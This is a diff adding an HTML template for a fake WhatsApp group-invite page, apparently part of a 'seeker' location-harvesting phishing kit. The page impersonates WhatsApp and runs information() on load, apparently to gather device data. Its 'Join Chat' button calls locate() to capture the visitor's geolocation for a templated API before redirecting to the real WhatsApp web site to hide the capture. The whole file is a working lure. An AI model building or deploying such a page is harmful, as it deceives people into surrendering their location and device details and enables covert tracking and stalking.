@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Group Invite</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #dcf8c6;
+      color: #000;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      max-width: 360px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 28px;
+      text-align: center;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+    }
+    .whatsapp-icon { font-size: 3rem; margin-bottom: 16px; }
+    h1 { font-size: 1.4rem; margin-bottom: 8px; color: #075e54; }
+    p { color: #667781; font-size: 0.95rem; line-height: 1.5; margin-bottom: 24px; }
+    .btn {
+      display: inline-block;
+      padding: 14px 32px;
+      background: #25d366;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn:hover { background: #20bd5a; }
+    #status { margin-top: 16px; font-size: 0.9rem; color: #667781; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="whatsapp-icon">💬</div>
+    <h1>WhatsApp Group Invite</h1>
+    <p>You've been added to a group. Join the chat to start messaging.</p>
+    <button id="joinBtn" class="btn" onclick="handleJoin()">Join Chat</button>
+    <div id="status"></div>
+  </div>
+  <script>
+    window.SEEKER_API_BASE = '{{ api_base }}';
+  </script>
+  <script src="/static/seeker/js/location.js"></script>
+  <script>
+    information();
+    function handleJoin() {
+      var btn = document.getElementById('joinBtn');
+      var status = document.getElementById('status');
+      btn.disabled = true;
+      btn.textContent = 'Joining...';
+      var redirectUrl = '{{ redirect_url }}' || 'https://web.whatsapp.com';
+      locate(
+        function() {
+          status.textContent = 'Redirecting...';
+          window.location.href = redirectUrl;
+        },
+        function(err, msg) {
+          status.textContent = 'Unable to join. ' + (msg || '');
+          btn.disabled = false;
+          btn.textContent = 'Join Chat';
+        }
+      );
+    }
+  </script>
+</body>
+</html>
